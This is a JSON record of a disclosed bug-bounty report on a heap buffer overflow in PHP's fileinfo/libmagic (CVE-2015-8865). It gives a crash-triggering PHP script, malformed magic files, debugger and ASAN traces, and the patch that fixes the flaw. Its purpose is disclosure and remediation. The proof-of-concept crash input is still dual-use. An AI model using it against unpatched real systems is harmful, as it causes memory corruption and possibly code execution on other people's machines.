{
  "id": 476179,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzYxNzk=",
  "url": "https://hackerone.com/reports/476179",
  "title": "Buffer over-write in finfo_open with malformed magic file.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-01-07T20:34:26.499Z",
  "submitted_at": "2019-01-07T20:34:26.499Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haquaman",
    "url": "/haquaman",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131614Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1681f44d0b70d6b59c2dcfc316dc980d8d735c01ed381fb641ac1c131b703ab9",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131614Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e63f5a8c7555beae6622ecd61cbcf4e6be21639a95707239126206e33e57e65"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2015-8865"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-11-09T01:46:27.320Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-10-10T01:46:23.598Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "https://bugs.php.net/bug.php?id=71527\n\nThis bug causes a segfault when running with environment variable USE_ZEND_ALLOC set to 0, and also when compiled with ASAN with USE_ZEND_ALLOC set and unset.\n\nTo reproduce, run the following PHP file, with the example magic file below.\n\n$ cat magic-open.php\n<?php\n$finfo = finfo_open(FILEINFO_NONE, $argv[1]);\n$info = finfo_file($finfo, $argv[2]);\nvar_dump($info);\n?>\n\nMagic file is (used without ASAN):\n$ xxd -g 1 magic.crash-noasan\n0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>\n0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e     >>>>>>>>>>>>>>>\n\n$ cat magic.crash-noasan\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n\nMagic file is (used with ASAN):\n$ xxd -g 1 magic.crash-asan\n0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>\n0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>\n0000020: 71 3e 3e 3e 3e 3e 3e 3e 3e 0a 00                 q>>>>>>>>..\n\n$ cat magic.crash-asan\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>q>>>>>>>>\n\nThen run the program like:\n\n./sapi/cli/php magic-open.php magic.crash /dev/null\n\nYou will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is UNSET (no crash).\n\n$ ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\n\nWarning: finfo_open(): Failed to load magic database at '/root/php-src/magic.crash-noasan'. in /root/php-src/magic-open.php on line 2\n\nWarning: finfo_file() expects parameter 1 to be resource, boolean given in /root/php-src/magic-open.php on line 3\nbool(false)\n\n\nYou will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is set to 0 (crash).\n\n $ USE_ZEND_ALLOC=0 ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\nSegmentation fault\n\n $ USE_ZEND_ALLOC=0 gdb --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null                                                                      \n<snip>\n(gdb) r\nStarting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\n\nProgram received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489\n3489    malloc.c: No such file or directory.\n(gdb) bt\n#0  _int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489\n#1  0x00007ffff73727b0 in __GI___libc_malloc (bytes=79) at malloc.c:2891\n#2  0x0000000000a9fb44 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffff9d30, fmt=fmt@entry=0x1188930 \"Failed to load magic database at '%s'.\", \n    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:245\n#3  0x0000000000aa260d in vspprintf (pbuf=pbuf@entry=0x7fffffff9d90, max_len=max_len@entry=0, format=format@entry=0x1188930 \"Failed to load magic database at '%s'.\", \n    ap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:821\n#4  0x0000000000a88caf in php_verror (docref=0x0, params=params@entry=0x116a24a \"\", type=type@entry=2, \n    format=format@entry=0x1188930 \"Failed to load magic database at '%s'.\", args=args@entry=0x7fffffff9e30) at /root/php-src/main/main.c:786\n#5  0x0000000000a8a644 in php_error_docref0 (docref=docref@entry=0x0, type=type@entry=2, format=format@entry=0x1188930 \"Failed to load magic database at '%s'.\")\n    at /root/php-src/main/main.c:965\n#6  0x00000000006e6338 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)\n    at /root/php-src/ext/fileinfo/fileinfo.c:348\n#7  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558\n#8  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363\n#9  0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341\n#10 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610\n#11 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994\n#12 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378\n(gdb) x/i $rip\n=> 0x7ffff736ff31 <_int_malloc+689>:    mov    %r14,0x10(%r9)\n(gdb) i r\nrax            0x7fffffff939f   140737488327583\nrbx            0x7ffff76ae760   140737344366432\nrcx            0x0      0\nrdx            0x7ffff76ae788   140737344366472\nrsi            0x7a0    1952\nrdi            0x7ffff76ae760   140737344366432\nrbp            0x60     0x60\nrsp            0x7fffffff9310   0x7fffffff9310\nr8             0x4      4\nr9             0x0      0\nr10            0x0      0\nr11            0x416c20 4287520\nr12            0x1878bb0        25660336\nr13            0x6      6\nr14            0x7ffff76ae7b8   140737344366520\nr15            0x2710   10000\nrip            0x7ffff736ff31   0x7ffff736ff31 <_int_malloc+689>\neflags         0x10287  [ CF PF SF IF RF ]\ncs             0x33     51\nss             0x2b     43\nds             0x0      0\nes             0x0      0\nfs             0x0      0\ngs             0x0      0\n\n\nWhen compiled WITH ASAN, and USE_ZEND_ALLOC is unset (crash).\n $ ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null\nASAN:SIGSEGV\n=================================================================\n==20824== ERROR: AddressSanitizer: SEGV on unknown address 0x00000001f168 (pc 0x000000f9d7d4 sp 0x7ffc11db3770 bp 0x000000000000 T0)\nAddressSanitizer can not provide additional info.\n    #0 0xf9d7d3 in zend_mm_remove_from_free_list /root/php-src/Zend/zend_alloc.c:809\n    #1 0xfa35f2 in _zend_mm_alloc_int /root/php-src/Zend/zend_alloc.c:2021\n    #2 0xddffe7 in xbuf_format_converter /root/php-src/main/spprintf.c:794\n    #3 0xde6b75 in vspprintf /root/php-src/main/spprintf.c:821\n    #4 0xde6b75 in spprintf /root/php-src/main/spprintf.c:840\n    #5 0xdc0d47 in php_verror /root/php-src/main/main.c:852\n    #6 0xdc142a in php_error_docref0 /root/php-src/main/main.c:965\n    #7 0x7fe8ca in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:348\n    #8 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558\n    #9 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363\n    #10 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341\n    #11 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610\n    #12 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994\n    #13 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378\n    #14 0x7f87f6409ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n    #15 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)\nSUMMARY: AddressSanitizer: SEGV /root/php-src/Zend/zend_alloc.c:809 zend_mm_remove_from_free_list\n==20824== ABORTING\nAborted\n\n\nAnd compiled with ASAN and USE_ZEND_ALLOC set to 0:\n\n $ USE_ZEND_ALLOC=0 ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null                                                                                     \n=================================================================\n==20849== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60340000cd04 at pc 0x8664d0 bp 0x7ffcc02d84b0 sp 0x7ffcc02d84a8\nWRITE of size 4 at 0x60340000cd04 thread T0\n    #0 0x8664cf in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:426\n    #1 0x80cd7b in parse /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520\n    #2 0x80cd7b in load_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022\n    #3 0x8184aa in apprentice_load /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215\n    #4 0x81c6dc in apprentice_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:417\n    #5 0x823594 in file_apprentice /root/php-src/ext/fileinfo/libmagic/apprentice.c:603\n    #6 0x7fe571 in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:347\n    #7 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558\n    #8 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363\n    #9 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341\n    #10 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610\n    #11 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994\n    #12 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378\n    #13 0x7f773df01ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n    #14 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)\n0x60340000cd04 is located 36 bytes to the right of 480-byte region [0x60340000cb00,0x60340000cce0)\nallocated by thread T0 here:\n    #0 0x7f773e9df55f (/usr/lib/x86_64-linux-gnu/libasan.so.0+0x1555f)\n    #1 0x8662ab in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:418\nSUMMARY: AddressSanitizer: heap-buffer-overflow /root/php-src/ext/fileinfo/libmagic/funcs.c:429 file_check_mem\nShadow bytes around the buggy address:\n  0x0c06ffff9950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c06ffff9960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff9970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff9980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff9990: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa\n=>0x0c06ffff99a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c06ffff99b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff99c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff99d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff99e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c06ffff99f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:     fa\n  Heap righ redzone:     fb\n  Freed Heap region:     fd\n  Stack left redzone:    f1\n  Stack mid redzone:     f2\n  Stack right redzone:   f3\n  Stack partial redzone: f4\n  Stack after return:    f5\n  Stack use after scope: f8\n  Global redzone:        f9\n  Global init order:     f6\n  Poisoned by user:      f7\n  ASan internal:         fe\n==20849== ABORTING\nAborted\n\n\n\nRight, so those are all the possible crash states, the patch to fix is simple:\n\ndiff --git a/ext/fileinfo/libmagic/funcs.c b/ext/fileinfo/libmagic/funcs.c\nindex bd6d3d5..aefb95d 100644\n--- a/ext/fileinfo/libmagic/funcs.c\n+++ b/ext/fileinfo/libmagic/funcs.c\n@@ -414,7 +414,7 @@ file_check_mem(struct magic_set *ms, unsigned int level)\n        size_t len;\n \n        if (level >= ms->c.len) {\n-               len = (ms->c.len += 20) * sizeof(*ms->c.li);\n+               while (level >= ms->c.len) len = (ms->c.len += 20) * sizeof(*ms->c.li);\n                ms->c.li = CAST(struct level_info *, (ms->c.li == NULL) ?\n                    emalloc(len) :\n                    erealloc(ms->c.li, len));\n\n\nReasoning for that patch is with these tests, level is set to either 31 (noasan test file), or 32 (asan test file), and ms->c.len is 10. Originally it added 20 to the length, then realloc'd the memory chunk, then indexed into the memory at position \"level\". This overflowed the memory, and a write occurred. This patch ensures that the memory length is over the size of level.\n\nYou can see this from some gdb sessions:\n\n$ gdb -ex 'break file_check_mem' -ex run -ex bt -ex 'p ms->c.len' -ex quit --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null \n<snip>\nBreakpoint 1 at 0x7235a0: file /root/php-src/ext/fileinfo/libmagic/funcs.c, line 413.\nStarting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\n\nBreakpoint 1, file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413\n413     {\n#0  file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413\n#1  0x00000000006f1f3a in parse (action=<optimized out>, lineno=<optimized out>, line=0x7fffffff5bd0 '>' <repeats 31 times>, me=0x7fffffff5bc0, ms=<optimized out>)\n    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520\n#2  load_1 (ms=ms@entry=0x1879810, action=action@entry=0, fn=fn@entry=0x18779e0 \"/root/php-src/magic.crash-noasan\", errs=errs@entry=0x7fffffff7c60, \n    mset=mset@entry=0x7fffffff7c70) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022\n#3  0x00000000006f9a03 in apprentice_load (ms=ms@entry=0x1879810, fn=fn@entry=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=action@entry=0)\n    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215\n#4  0x00000000006fdfa6 in apprentice_1 (ms=0x1879810, fn=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=0) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:417\n#5  0x00000000006fffae in file_apprentice (ms=0x1879810, fn=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=0)\n    at /root/php-src/ext/fileinfo/libmagic/apprentice.c:603\n#6  0x0000000000725bb7 in magic_load (ms=<optimized out>, magicfile=<optimized out>) at /root/php-src/ext/fileinfo/libmagic/magic.c:267\n#7  0x00000000006e61e5 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)\n    at /root/php-src/ext/fileinfo/fileinfo.c:347\n#8  0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558\n#9  0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363\n#10 0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341\n#11 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610\n#12 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994\n#13 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378\n$1 = 10\n\n\nSo looking at the possible attacks, without asan, and not using zend alloc, we have a segfault in alloc, where alloc is presumably trying to determine free space from unassigned memory that we wrote to when overflowing, this causes a crash. This is backed up when we look at the stack trace of when we run with asan, and using zend_alloc, where we get a segfault in zend_mm_remove_from_free_list, which is caused by a call to ZEND_MM_CHECK_TREE with a mm_block with an invalid parent pointer.\n\nRunning with asan, and not using zend alloc, pinpoints the location of the buffer overwrite, to be in file_check_mem, where we patched.\n\nAfter the patch, there are no crashes, and you get the message the same as running without asan and with zend alloc.\n\nThanks for taking the time to read this report, sorry it was such a long one, just wanted to get across all the different scenarios.\n\n--\n\nUpstream bug for libmagic was reported at http://bugs.gw.com/view.php?id=522\n\nThis was fixed with a slightly different patch from upstream libmagic and applied to PHP\n\n## Impact\n\nCan write arbitrary memory after the buffer, which leads to memory corruption and possibly remote code execution",
  "bounty_amount": "1500.0",
  "formatted_bounty": "$1,500",
  "weakness": {
    "id": 5,
    "name": "Heap Overflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-11-09T01:46:23.720Z",
  "allow_singular_disclosure_after": -102943791.01428185,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "thedarkvisitor"
  ],
  "severity": {
    "rating": "high",
    "score": 7.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
